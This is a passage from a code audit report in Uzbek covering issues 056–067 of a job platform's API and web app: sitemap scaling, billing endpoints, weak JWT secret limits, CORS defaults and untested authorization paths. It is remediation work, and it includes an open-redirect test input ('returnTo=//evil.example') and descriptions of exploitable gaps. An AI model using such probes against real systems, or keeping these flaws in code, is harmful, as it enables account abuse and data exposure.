- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** seo/sitemap
- **Fayl:** `apps/api/src/modules/seo/seo.routes.ts:706`
- **Root cause:** `findMany take 50000` + har URL uchun 3 hreflang + x-default satrlar; Cache-Control yo'q; `company.findMany` barcha kompaniyalar (vakansiyasi yo'q/bo'sh profillar ham).
- **Impact:** 20k vakansiya × ~600 bayt ≈ 12 MB javob har crawler so'rovida; string konkatenatsiya + DB o'qish; Google 50 MB chegarasiga yaqinlashish xavfi 50k'da.
- **Evidence:** seo.routes.ts:708-717, 721-730, 735-745, 749-764 buildUrlSet.
- **Recommended fix:** Sitemap index'ni 5 000 talik bo'laklarga bo'lish (`/sitemap-vacancy-1.xml`, skip/take yoki publishedAt cursor), `select` faqat slug/updatedAt (bor), in-memory kesh 1 soat + `Cache-Control: public, max-age=3600`; hreflang'ni `/ru`,`/en` faqat kerak bo'lsa (yoki x-default olib tashlash) — hajm ~40% kamayadi. Companies: faqat `vacancies: { some: { status:'active' } }` yoki description bor kompaniyalar.
- **Dependencies:** apps/web/vercel.json rewrites (`/sitemap*.xml`) yangi nomlarni ham qamrab olishi kerak.
- **Risk:** Past.
- **Bajarilgan fix:** Sitemap: bo'sh/bloklangan kompaniya profillari chiqmaydi, `orderBy`. Origin keshi va 50k dan katta bo'laklash qilinmadi.
- **Test/dalil:** e2e `[ISSUE-056/050]` va sitemap tekshiruvlari PASS
- **Birlashtirilgan manbalar (2):**
  - R120 [db-performance, P2] `apps/api/src/modules/seo/seo.routes.ts:706` — Sitemap'lar — 50 000 tagacha yozuv har so'rovda, 4 hreflang alternate bilan ~12 MB XML xotirada, kesh yo'q; companies sitemap filtrsiz
  - R171 [routing-seo, P2] `apps/api/src/modules/seo/seo.routes.ts:114` — sitemap-employer barcha kompaniyalarni (bo'sh, auto-yaratilgan, bloklangan egali) filtrsiz va tartibsiz kiritadi

### ISSUE-057

**Vakansiya ko'rilganda viewsCount prisma.update bilan oshadi: updatedAt yangilanadi (sitemap lastmod buziladi), GET javobi yozishni kutadi**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** seo/data
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:359`
- **Root cause:** `prisma.vacancy.update({ data: { viewsCount: { increment: 1 } } })`: Vacancy.updatedAt `@updatedAt` (schema.prisma:428). Articles'da bu muammo aynan shu sabab bilan $runCommandRaw orqali tuzatilgan (articles.routes.ts:46-55), vakansiyada tuzatilmagan. Update await qilinadi, ya'ni GET javobi yozish tugashini kutadi.
- **Impact:** Har detail SSR = 1 sinxron yozish. sitemap-vacancy.xml (seo.routes.ts:101-108) lastmod'i mashhur vakansiyalarda doim "hozir" bo'ladi, bu crawl budget'ni isrof qiladi va "yangilangan" signalini buzadi. updatedAt biznes-mantiqda ishonchsiz bo'lib qoladi.
- **Evidence:** vacancies.service.ts:359-362; schema.prisma:426-428; articles.routes.ts:46-55 (to'g'ri naqsh).
- **Recommended fix:** Articles'dagi incrementCounter naqshini qo'llang: `prisma.$runCommandRaw({ update: "vacancies", updates: [{ q: { _id: { $oid: id } }, u: { $inc: { views_count: 1 } } }] })`, `void` bilan, javobni kutdirmasdan.
- **Dependencies:** Yo'q
- **Risk:** Past
- **Bajarilgan fix:** Ko'rishlar `$runCommandRaw $inc` bilan (updatedAt o'zgarmaydi, javob kutmaydi).
- **Test/dalil:** PHASE 6: e2e `[PHASE6-U31]` ko'rishlar aynan +1, `updatedAt` o'zgarmaydi — PASS
- **Birlashtirilgan manbalar (3):**
  - R108 [data-scale, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:359` — Vakansiya ko'rilganda viewsCount prisma.update orqali oshiriladi, bu @updatedAt'ni ham yangilaydi va sitemap lastmod har ko'rishda o'zgaradi
  - R172 [routing-seo, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:359` — Har ko'rishda viewsCount update qilinadi, @updatedAt yangilanadi — sitemap lastmod ma'nosiz; SSR/bot GET ham bazaga yozadi
  - R217 [db-performance, P3] `apps/api/src/modules/vacancies/vacancies.service.ts:359` — Vakansiya detail — har ko'rishda `update viewsCount` (`@updatedAt` ham yangilanadi → sitemap lastmod har doim 'hozir') + to'liq company include (stir, ownerUserId, subscription*, images)

### ISSUE-058

**/api/employer/vacancies chegarasiz to'liq hujjatlar; tahrirlash sahifasi bitta vakansiya uchun butun ro'yxatni yuklaydi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** scale/api
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:575`
- **Root cause:** `where: { company: { ownerUserId } }` ($lookup), take yo'q, `region: true, category: true` to'liq, `_count.applications` per vakansiya.
- **Impact:** Yirik ish beruvchi (yuzlab vakansiya, har biri to'liq description) → katta javob va sekin sahifa; 20k vakansiya miqyosida $lookup companies har safar.
- **Evidence:** vacancies.routes.ts:575-585.
- **Recommended fix:** companyId ni avval topib `where: { companyId }` (indeks companyId); `?status=&page=&pageSize<=50`; ro'yxatda `select` (id, slug, title, status, salary*, workplaceType, publishedAt, viewsCount, region{name,slug}, category{name,slug}); applicationCount'ni `application.groupBy({ by: ['vacancyId'], where: { vacancyId: { in } } })` bilan; `@@index([companyId, status, createdAt])`.
- **Dependencies:** apps/web/src/pages/employer/vacancies/+Page.tsx.
- **Risk:** Past-o'rta (javob shakli: items to'liq → sahifali).
- **Bajarilgan fix:** `companyId` indeksi bilan, 1000 ta chegara. Tahrirlash sahifasi hali butun ro'yxatni yuklaydi.
- **Test/dalil:** e2e ish beruvchi vakansiyalari PASS
- **Birlashtirilgan manbalar (2):**
  - R123 [db-performance, P2] `apps/api/src/modules/vacancies/vacancies.routes.ts:575` — /api/employer/vacancies — chegarasiz, relation filtr, to'liq region/category include, har vakansiya uchun _count
  - R131 [employer-product, P2] `apps/api/src/modules/vacancies/vacancies.routes.ts:104` — /api/employer/vacancies cheklanmagan to'liq hujjatlar qaytaradi; tahrirlash sahifasi bitta vakansiya uchun butun ro'yxatni yuklaydi

### ISSUE-059

**PATCH status→active kategoriya va ish joylashuvi qoidasini qayta tekshirmaydi: to'liq bo'lmagan eski yozuvlar qayta e'lon qilinadi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** product/workplace
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:214`
- **Root cause:** POST va PUT `assertVacancyPlacement` chaqiradi, PATCH status esa draft/archived→active'da chaqirmaydi. workplaceType=null yoki categoryId=null bo'lgan eski yozuvlar (schema'da ixtiyoriy) faollashtiriladi.
- **Impact:** Kategoriyasiz yoki joylashuvsiz vakansiya ommaviy ro'yxatga, facet'larga va indeksga tushadi, kategoriya facet'ida hisoblanmaydi. Rule 2 ('kategoriya majburiy') faqat yaratish/tahrirlashda amal qiladi, qayta faollashtirishda emas.
- **Evidence:** vacancies.routes.ts:195-223 (assert yo'q) vs 139, 154-158; schema.prisma:398, 408 (categoryId?, workplaceType?).
- **Recommended fix:** `status === 'active'` bo'lganda `await assertVacancyPlacement({ categoryId: vacancy.categoryId, regionId: vacancy.regionId, workplaceType: vacancy.workplaceType ?? (vacancy.employmentType === 'remote' ? 'remote' : null) })`. Xato bo'lsa 400 'Avval tahrirlab kategoriya/joylashuvni to'ldiring'. Frontend vacancyActionErrorKind 400'ni generic emas, backend xabari bilan ko'rsatsin.
- **Dependencies:** lib/employer/vacancies/api.ts setVacancyStatus xabarni tashlab yuboradi (api.ts:767), uni ApiError message bilan uzatish kerak.
- **Risk:** O'rta: eski archived vakansiyalarni tahrirlamasdan faollashtirish endi bloklanadi (backward compat trade-off).
- **Bajarilgan fix:** `archived/draft → active` telefon, kategoriya, ish joylashuvi va hududni qayta tekshiradi. PHASE 6: Eski masofaviy e'lon PUT'da ham qabul qilinadi (ISSUE-129).
- **Test/dalil:** e2e `[ISSUE-025/024/059]` PASS; PHASE 6: e2e `[PHASE6-U18]` PASS

### ISSUE-060

**Ariza holati izohi chatga to'g'ridan-to'g'ri DB yozuvi bo'lib tushadi (real-time push yo'q); bildirishnoma izohsiz ham /messages ga olib boradi**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** realtime
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:249`
- **Root cause:** Izoh `prisma.message.create` bilan yoziladi, chat modulidagi `sendToUser` (chat.routes.ts:111-125) chaqirilmaydi. PATCH route'da `requirePhoneVerified` yo'q, holbuki `/api/conversations/start` uni talab qiladi (chat.routes.ts:140). Bildirishnoma izoh bo'lmasa ham `url: '/messages'` va 'Suhbatni ochish' CTA'si bilan ketadi.
- **Impact:** Nomzod onlayn bo'lsa ham izoh chatda real vaqtda ko'rinmaydi. Telefoni tasdiqlanmagan employer boshqa yo'l bilan yoza olmaydigan nomzodga shu yo'l bilan xabar yubora oladi. Izohsiz holat o'zgarishida nomzod bo'sh yoki aloqasiz suhbatga yo'naltiriladi.
- **Evidence:** applications.routes.ts:243-252, 262-269; chat.routes.ts:111-125 (sendToUser), 140 (requirePhoneVerified).
- **Recommended fix:** chat modulidan xabar yaratish va push qilishni bitta exported helper'ga (`postSystemMessage(conv, senderId, body)`) chiqarib, shu yerda ishlatish. Izoh bo'lsa phone gate qo'llash (yoki izohni faqat verified employer uchun qabul qilish). `url` va `ctaLabel`: izoh bo'lsa /messages, bo'lmasa /applications.
- **Dependencies:** chat.routes.ts'dagi sendToUser/isOnline eksporti.
- **Risk:** Past
- **Bajarilgan fix:** Holat izohi `deliverMessage()` orqali real-time; havola suhbatga yoki `/applications` ga.
- **Test/dalil:** e2e `[ISSUE-036/014/060]` PASS
- **Birlashtirilgan manbalar (3):**
  - R128 [employer-product, P2] `apps/api/src/modules/applications/applications.routes.ts:249` — Holat izohi chatga to'g'ridan-to'g'ri DB yozuvi sifatida tushadi: WS push yo'q, chat telefon gate'i chetlab o'tiladi, notify URL izohsiz ham /messages
  - R152 [realtime-notifications, P2] `apps/api/src/modules/applications/applications.routes.ts:248` — Rad etish/taklif sababi xabar sifatida to'g'ridan-to'g'ri DB'ga yoziladi — real-time uzatilmaydi, Telegram fallback yo'q
  - R243 [realtime-notifications, P3] `apps/api/src/modules/applications/applications.routes.ts:267` — Bildirishnoma havolalari: ariza holati → /messages (suhbat bo'lmasligi mumkin), /pricing → 302 redirect

### ISSUE-061

**Meilisearch yo'lida DB'dan olingan qatorlar status bo'yicha qayta filtrlanmaydi; reindexAll deleteAll bilan bo'sh oraliq qoldiradi**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** search/meili
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:213`
- **Root cause:** Indeks sinxronizatsiyasi fire-and-forget (`void syncVacancyIndex`, vacancies.routes.ts:189,221,234; admin.routes.ts:185,282). Engine qaytargan id'lar `where: { id: { in: engine.ids } }` bilan olinadi, `status: "active"` sharti yo'q. total ham engine'dan olinadi.
- **Impact:** Meili sync xatosida archived yoki rejected vakansiya qidiruv natijasida ko'rinadi, bosilganda 404 (detail status tekshiradi). total/pageCount noto'g'ri bo'ladi.
- **Evidence:** vacancies.service.ts:212-219 `const rows = await prisma.vacancy.findMany({ where: { id: { in: engine.ids } }, include: LIST_INCLUDE });`
- **Recommended fix:** `where: { id: { in: engine.ids }, status: "active" }`. Sync xatolarini log qilish va retry (yoki davriy reindex).
- **Dependencies:** search.service.ts indexVacancy/removeVacancyFromIndex
- **Risk:** Past.
- **Lead auditor izohi:** Meili sukut bo'yicha o'chiq.
- **Bajarilgan fix:** Meili natijalari `status: active` bilan qayta filtrlanadi; reindex 1000 talik bo'laklarda, `deleteAll`siz, eskirgan ID'lar diff bilan o'chiriladi. PHASE 6: Reindex keyset sahifalash (ISSUE-126).
- **Test/dalil:** API typecheck/build PASS; NOT RUN — Meilisearch test muhitida yo'q
- **Birlashtirilgan manbalar (3):**
  - R091 [candidate-public, P2] `apps/api/src/modules/vacancies/vacancies.service.ts:213` — Meilisearch yo'lida bazadan olingan qatorlar status bo'yicha qayta filtrlanmaydi: eskirgan indeksda yopilgan vakansiya ro'yxatda chiqadi
  - R102 [data-scale, P2] `apps/api/src/modules/search/search.service.ts:174` — reindexAll har server startida deleteAllDocuments + bitta katta addDocuments qiladi; oraliqda Meili 0 natija qaytaradi va bu "natija yo'q" bo'lib ko'rinadi
  - R216 [db-performance, P3] `apps/api/src/modules/search/search.service.ts:882` — reindexAll — barcha faol vakansiyalar bitta findMany + bitta addDocuments (Meili payload limiti), warmSearchIndex har server startida to'liq reindex

### ISSUE-062

**.env.example'da NODE_ENV yo'q; lokal .env'da ishlatilmaydigan qoldiqlar; test:e2e eski dist'ni ishlatadi; ws faqat tranzitiv dependency**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** infra/config
- **Fayl:** `apps/api/.env.example:10`
- **Root cause:** env.ts:5 NODE_ENV default 'development'. U berilmasa refresh cookie Lax va secure=false (auth.routes.ts:39-40), CORS'ga localhost origin'lar qo'shiladi (env.ts:110), CSP 'unsafe-eval' va ws: (server.ts:63,71), HSTS o'chiq (81-83). .env.example'da NODE_ENV qatori yo'q, DEPLOY.md:62,74 esa uni 'majburiy' deydi. apps/api/.env:4 REDIS_URL va :9 SITE_URL kodda hech qayerda o'qilmaydi (grep bo'sh), :2 eski PostgreSQL satri izohda. JWT_*_SECRET z.string().min(8) (env.ts:18-19) prod uchun juda zaif.
- **Impact:** Railway'da NODE_ENV unutilsa: seans har yangilanishda yo'qoladi (Lax cross-site), prod CORS'da http://localhost:* credentials bilan ruxsat oladi, HSTS yo'q. 8 belgili secret brute-force qilinishi mumkin.
- **Evidence:** env.ts:5,18-19,105-111; .env.example (NODE_ENV yo'q; qolgan 40 kalit env.ts bilan mos); apps/api/.env qatorlari 2,4,9; DEPLOY.md:62,74,197.
- **Recommended fix:** .env.example boshiga `NODE_ENV=development  # Railway'da production` qo'shing. env.ts'da superRefine: NODE_ENV=production bo'lsa JWT secret'lar min(32) va bir-biriga teng emas. Startup'da `if (!isProd && process.env.RAILWAY_ENVIRONMENT) app.log.warn('NODE_ENV=production emas')`. Lokal .env'dan REDIS_URL/SITE_URL/eski PG satrini olib tashlang.
- **Dependencies:** Mavjud prod secret'lar 32 belgidan qisqa bo'lsa, rotatsiya hamma seanslarni chiqaradi.
- **Risk:** O'rta (secret min uzunligi prod startni to'xtatishi mumkin — avval warn, keyin enforce).
- **Bajarilgan fix:** `.env.example`: `NODE_ENV`, `TRUST_PROXY`, `CORS_PREVIEW_ORIGIN_REGEX`, `BILLING_ENABLED`, JWT ≥32; env superRefine. `pretest:e2e` build skripti va `ws` devDependency qo'shilmadi. PHASE 6: e2e skripti eskirgan `dist` ni aniqlab to'xtaydi (ISSUE-146); production'da namunaviy JWT sirlari rad etiladi (ISSUE-119). `ws` devDependency va lokal `.env` qoldiqlari o'zgartirilmadi.
- **Test/dalil:** PHASE 6: e2e 94/94 PASS
- **Birlashtirilgan manbalar (2):**
  - R189 [tests-infra, P2] `apps/api/.env.example:10` — NODE_ENV .env.example'da yo'q (default 'development' prod'da jim xavfsizlik rejimini o'chiradi); lokal .env'da ishlatilmaydigan REDIS_URL/SITE_URL; JWT secret min(8)
  - R190 [tests-infra, P2] `apps/api/package.json:17` — test:e2e eski dist'ni qayta build qilmasdan ishlatadi; 'ws' faqat tranzitiv; root'da test/CI yo'q; faqat NODE_ENV=production rejimi testlanadi

### ISSUE-063

**E2E: kritik authz yo'llari (summary, conversations/start, rating, saved-search IDOR, uploads, admin non-admin) testlanmagan; yetim server jarayoni; force-reset sharti substring 'test'**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** tests
- **Fayl:** `apps/api/scripts/e2e-check.mjs:886`
- **Root cause:** 52 check asosan happy-path va tanlangan IDOR'larni qamraydi. Qamralganlar: vakansiya PUT/PATCH/DELETE begona (714-723), ariza status begona (357-363), notifications (823-874), favorites (802-821), messages begona (375-389). Qamralmaganlar (grep=0): /api/users/:id/summary (chat.routes.ts:400), /api/conversations/start (140), /api/conversations/:id/rating (329,360), PATCH/DELETE /api/saved-searches/:id begona (alerts.routes.ts:115-145), DELETE /api/reviews/:id begona (reviews.routes.ts:77), /api/admin/users|overview|vacancies/:id/moderate|broadcast|payments/:id/confirm'ga nomzod/employer (admin.routes.ts:39-500; e2e 886-899 faqat /api/admin/articles va /team), /api/auth/refresh rotatsiya, logout cookie tozalash, bloklangan oddiy user refresh, /api/profile/resume va /api/employer/company/logo tur validatsiyasi, 429.
- **Impact:** Bu route'larda regressiya (masalan admin guard olib tashlansa yoki summary'da conversation tekshiruvi buzilsa) deploydan oldin sezilmaydi. Nomzod shaxsiy ma'lumoti chiqib ketishi (summary) yoki admin panel ochilib qolishi mumkin.
- **Evidence:** e2e-check.mjs check ro'yxati (grep '^await check(' = 52); coverage grep: conversations/start=0, /summary=0, moderate=0, saved-searches/=0, api/reviews/=0, profile/resume=0, company/logo=0, auth/refresh=0, auth/logout=0, broadcast=0, payments=0, 429=0.
- **Recommended fix:** Bitta 'authz matritsasi' check qo'shing: [path, method] ro'yxati × [guest→401, seeker→403, employer→403] (admin route'lar). IDOR check'lar: seeker2 → PATCH/DELETE seeker'ning saved-search → 403; hr2 → GET /api/users/<seekerId>/summary → 403; seeker2 → DELETE review → 403. Refresh: login → cookie bilan /refresh → yangi token; logout → Max-Age=0; bloklangan user /refresh → accessToken null.
- **Dependencies:** P2023 fix (malformed id check'lari uchun); candidates 402 fix.
- **Risk:** Past (faqat test).
- **Bajarilgan fix:** e2e 52 → 78 tekshiruv (xavfsizlik, IDOR, masshtab chegaralari). Frontend uchun avtomatik test yo'q. PHASE 6: e2e 78 → 94 tekshiruv (PHASE 6 shartnomalari, kuchaytirilgan tasdiqlar, hermetik muhit); web unit-check (3). Repo'da frontend e2e/brauzer testi yo'q (audit brauzer skriptlari scratchpad'da).
- **Test/dalil:** PHASE 6: e2e 94/94 PASS, unit-check 3/3 PASS
- **Birlashtirilgan manbalar (3):**
  - R191 [tests-infra, P2] `apps/api/scripts/e2e-check.mjs:886` — Kritik authz yo'llari testlanmagan: users/:id/summary, conversations/start va rating, saved-searches IDOR, reviews DELETE, admin (articles/team'dan tashqari) non-admin, refresh lifecycle, uploads
  - R192 [tests-infra, P2] `apps/api/scripts/e2e-check.mjs:85` — E2E: yetim server jarayoni va eski serverga qarshi yolg'on 'OK', sleep'ga tayangan kutishlar, zanjirli holat
  - R193 [tests-infra, P2] `apps/api/scripts/e2e-check.mjs:33` — --force-reset xavfsizlik sharti substring 'test' — 'latest', 'contest', 'attestation' kabi ishchi baza nomlari ham o'tadi

### ISSUE-064

**Eski billing backend ochiq: istalgan employer pending Payment yarata oladi, webhook method/summani tekshirmaydi, bildirishnoma va return URL'lar /pricing'ga, ensurePlans har startda**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** monetization
- **Fayl:** `apps/api/src/modules/billing/billing.routes.ts:103`
- **Root cause:** billing.routes.ts:103-115 `requireRole("employer")` bilan har qanday employer `createCheckout` chaqiradi; billing.service.ts:198-233 har chaqiruvda yangi `Payment{status:pending}` yaratadi — mavjud pending'ni qayta ishlatmaydi, kompaniya bo'yicha cheklov yo'q; provayder sozlanmagan bo'lsa `checkoutUrl = WEB_ORIGIN/pricing?pending=...` (:223) — bu sahifa 302 → /employer. Yagona to'siq — global rate-limit 600/min (server.ts:103). GET /api/plans (:27-49, autentifikatsiyasiz) va GET /api/employer/subscription (:52-69), /api/employer/payments (:72-100) ham tirik, lekin web hech qayerda o'qimaydi (fetchPlans/fetchSubscription/fetchMyPayments faqat guard ortidagi pages/pricing/+Page.tsx'da).
- **Impact:** Zararli emas (hech narsa ochilmaydi, pul yechilmaydi), lekin: (1) payments kolleksiyasi cheksiz o'sishi mumkin (scale prinsipi 'bounded data'), (2) admin /admin/payments'da soxta 'Kutilmoqda' qatorlar paydo bo'lib, admin tasdiqlasa (admin.routes.ts:469-486) kompaniyaga plan biriktiriladi va foydalanuvchiga '"Standart" tarifi faollashtirildi' bildirishnomasi ketadi, (3) /api/plans ommaga 490 000 / 1 290 000 so'm narxlarni ko'rsatadi — 'platforma bepul' bilan zid.
- **Evidence:** billing.routes.ts:103-115; billing.service.ts:207-218 `prisma.payment.create({... status: "pending"})`; :221-223 `\`${env.WEB_ORIGIN}/pricing?pending=${transactionId}\``; server.ts:177 `await app.register(billingRoutes);`.
- **Recommended fix:** Feature-flag: env.ts `features` ga `billing: env.BILLING_ENABLED === "true"` qo'shing (default false); server.ts:177 `if (features.billing) await app.register(billingRoutes);` va :194 `ensurePlans()` ni shu shartga oling. Webhook (:121) ham shu flag ostida qoladi. Muqobil (minimal): faqat :103-115 checkout'ni flag bilan 404 qiling.
- **Dependencies:** e2e-check.mjs:139-153 (/api/plans kutish + tarif soni), demo-seed.ts:1620-1624 (`ensurePlans` + plan id'lari) — demo seed mustaqil `ensurePlans()` chaqiradi, flag'ga bog'liq emas.
- **Risk:** Past: web hech bir tirik sahifa bu endpoint'larni chaqirmaydi; admin payments paneli /api/admin/* da, ta'sirlanmaydi.
- **Bajarilgan fix:** Billing yo'llari va `ensurePlans` `BILLING_ENABLED` ortida (sukut o'chiq); havolalar `/profile` (D-014).
- **Test/dalil:** e2e `/api/plans` va webhook 404 PASS
- **Birlashtirilgan manbalar (6):**
  - R146 [monetization, P2] `apps/api/src/modules/billing/billing.routes.ts:103` — POST /api/employer/subscription/checkout istalgan employer'ga ochiq — UI'siz, lekin cheksiz pending Payment yozuvi yaratadi
  - R147 [monetization, P2] `apps/api/src/modules/billing/billing.routes.ts:121` — Provayder webhook'i imzo o'tgach HAR QANDAY so'rovda to'lovni 'paid' qiladi — method/action/summa tekshirilmaydi (kalitlar bo'sh bo'lgani uchun hozir 401)
  - R148 [monetization, P2] `apps/api/src/modules/billing/billing.routes.ts:155` — Bildirishnomalar 'tarifi faollashtirildi' matni va url:/pricing bilan yaratiladi — demo hr hisobida ham
  - R255 [routing-seo, P3] `apps/api/src/modules/admin/admin.routes.ts:483` — Bildirishnoma va to'lov return URL'lari hali /pricing'ga ishora qiladi — 302 → /employer → client redirect → /profile zanjiri
  - R239 [monetization, P3] `apps/api/src/server.ts:194` — ensurePlans() har server ko'tarilishida 3 ta upsert bajaradi va DEFAULT_PLANS'da bajarilmaydigan va'dalar bor
  - R234 [monetization, P3] `apps/api/.env.example:104` — .env.example va env.ts to'lov provayderi bo'limi 'qo'lda tasdiqlash rejimi'ni amaldagi funksiya deb tasvirlaydi

### ISSUE-065

**README/DEPLOY/DESIGN tariflar, limit va /pricing'ni amaldagi funksiya deb yozadi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** docs/monetization
- **Fayl:** `README.md:108`
- **Root cause:** README.md:108 'Nomzodlar bazasidan qidiruv (Standart va Premium tariflarda)', :109 '**Tariflar va to'lov**: Payme / Click ... `/pricing`', :110 'Faol vakansiya limiti tarif bo'yicha avtomatik nazorat qilinadi', :118 '/admin/payments'. DEPLOY.md:162 e2e 'tarif limiti'ni tekshiradi deydi. apps/web/DESIGN.md:183-184 FAQ fakti 'bepul tarifda 3 ta' — o'sha DESIGN.md:73-75 'Monetizatsiya yo'q ... cheklanmagan' va i18n FAQ (messages.uz.ts:441-443 'faol vakansiyalar soni cheklanmagan') bilan zid. tizim-arxitekturasi.md:161 'Vakansiya joylash ✅ (tarif chegarasida)', :638 '14. Monetizatsiya ✅ Tariflar, limitlar, Payme/Click' — §14 (:541-548) 'hech qanday to'lov integratsiyasi MVP'da yozilmaydi' degani bilan zid.
- **Impact:** Yangi dasturchi/mijoz hujjatga qarab limit va to'lovni mavjud deb hisoblaydi; kod haqiqat manbai bo'lsa ham farq topilma. `/pricing` havolasi 302 → /employer (pages/pricing/+guard.ts:10-12).
- **Evidence:** README.md:108-110; DEPLOY.md:162; DESIGN.md:184 'bepul tarifda 3 ta'; tizim-arxitekturasi.md:161, 638.
- **Recommended fix:** README 'Ish beruvchi' bo'limida :108-110 ni 'Nomzodlar bazasidan qidiruv (bepul)' ga almashtiring, /pricing va limit satrlarini olib tashlang; :118 admin payments satrini 'eski to'lov yozuvlari (monetizatsiya o'chiq)' deb belgilang yoki olib tashlang. DESIGN.md:184 'bepul tarifda 3 ta' → 'cheklanmagan'. DEPLOY.md:162 'tarif limiti' → 'vakansiya soni cheklanmagani'. tizim-arxitekturasi.md:161,638 ga 'hozircha bepul' eslatma.
- **Dependencies:** Yo'q.
- **Risk:** Yo'q (hujjat).
- **Bajarilgan fix:** README, DEPLOY.md, `.env.example` monetizatsiya bandlari bepul modelga moslandi. PHASE 6: DEPLOY.md e2e tavsifi amaldagi qamrovga moslandi (ISSUE-145).
- **Test/dalil:** Hujjat ko'rib chiqildi

### ISSUE-066

**Login'da returnTo yo'q, rol guard'lari faqat client'da va redirect zanjirlari bor, rezyume holati xatoda noto'g'ri 'to'ldiring' deydi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** frontend/routing
- **Fayl:** `apps/web/src/lib/useRoleGuard.ts:133`
- **Root cause:** employer/*, applications, favorites, alerts sahifalari `useRequireRole` (useRoleGuard.ts:130-143) — useEffect ichida `window.location.assign` (to'liq sahifa reload). Vike +guard.ts faqat pricing/article/vacancy'da bor (find natijasi), auth sahifalari uchun yo'q (server cookie'ni ko'rmaydi — cookie path=/api/auth, API boshqa domenda, shuning uchun server-side guard hozirgi arxitekturada imkonsiz). AdminShell (57-64) loading'da skeleton — yaxshi; lekin mehmon uchun redirect emas, "ruxsat yo'q" sahifasi (66-92).
- **Impact:** Mehmon /employer/vacancies ni ochsa avval sahifa qobig'i (skeleton/bo'sh holat) chiqadi, keyin reload bilan /login — "flash" va ikki marta yuklash. Xavfsizlikka ta'sir yo'q (backend authoritative, ma'lumot tokensiz kelmaydi).
- **Evidence:** apps/web/src/lib/useRoleGuard.ts:130-158; apps/web/src/components/AdminShell.tsx:57-92; apps/web/src/pages/**/+guard.ts ro'yxati (employer/admin uchun yo'q).
- **Recommended fix:** Hozirgi arxitekturada minimal: useRequireRole'ga `status === "loading" || status === "guest"` bo'lganda sahifa kontenti o'rniga skeleton qaytaradigan `<RequireRole>` wrapper (AdminShell naqshi) va `navigate()` (vike/client/router) bilan client-side redirect (+ `next` param, #9). Server-side guard uchun kelajakda: SSR'da API'ga cookie forward (cookie path'ini kengaytirish) — katta o'zgarish, hozir tavsiya etilmaydi.
- **Dependencies:** #9 (next param); barcha useRequireRole ishlatuvchi 12 sahifa.
- **Risk:** Past.
- **Bajarilgan fix:** Login `returnTo` (faqat xavfsiz ichki yo'l) — rol guard va profil yo'naltirishlarida. Guard'lar hali faqat client tomonda.
- **Test/dalil:** web typecheck/build PASS; brauzer S2: mehmon /applications → /login?returnTo=%2Fapplications PASS; S3: returnTo=//evil.example → kirishdan keyin sayt ichida PASS
- **Birlashtirilgan manbalar (4):**
  - R074 [auth, P2] `apps/web/src/lib/useRoleGuard.ts:133` — Himoyalangan sahifalar faqat client-side effect bilan guard qilinadi: SSR shell ko'rinadi, redirect to'liq reload; server +guard.ts yo'q
  - R075 [auth, P2] `apps/web/src/pages/login/+Page.tsx:32` — returnTo/next yo'q — login har doim "/" ga tashlaydi; guard'lar maqsad sahifani yo'qotadi (open redirect yo'qligi tasdiqlandi)
  - R092 [candidate-public, P2] `apps/web/src/pages/login/+Page.tsx:32` — Apply oqimi: login returnTo yo'q, rezyume holati xatoda noto'g'ri "rezyumeni to'ldiring" deydi
  - R175 [routing-seo, P2] `apps/web/src/lib/useRoleGuard.ts:18` — Rol guard'lar faqat client'da: SSR kontenti chaqnaydi, returnTo yo'q, redirect zanjirlari bor

### ISSUE-067

**Qo'ng'iroq: ikkinchi WS reconnect'siz, xatoda son 0 ga tushadi, eskirgan javoblar holatni yozadi, badge takroriy +1**

- **Severity:** P2 (agent bahosi: P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** frontend/notifications
- **Fayl:** `apps/web/src/lib/useNotifications.ts:61`
- **Root cause:** NotificationBell (Header'da doim) useNotifications orqali `/ws/chat` ga ulanadi (61-88); /messages sahifasida useChatSocket ham xuddi shu endpointga ikkinchi ulanish ochadi (useChatSocket.ts:35). useNotifications soketida `onclose` reconnect yo'q — server restart/tarmoq uzilsa real-time bildirishnomalar token yangilangunga (≤12 daq) qadar jim, faqat 45s polling qoladi. Ustiga useInboxSummary (20s) + useNotifications (45s) polling + focus/CUSTOM event'larda throttle'siz refresh.
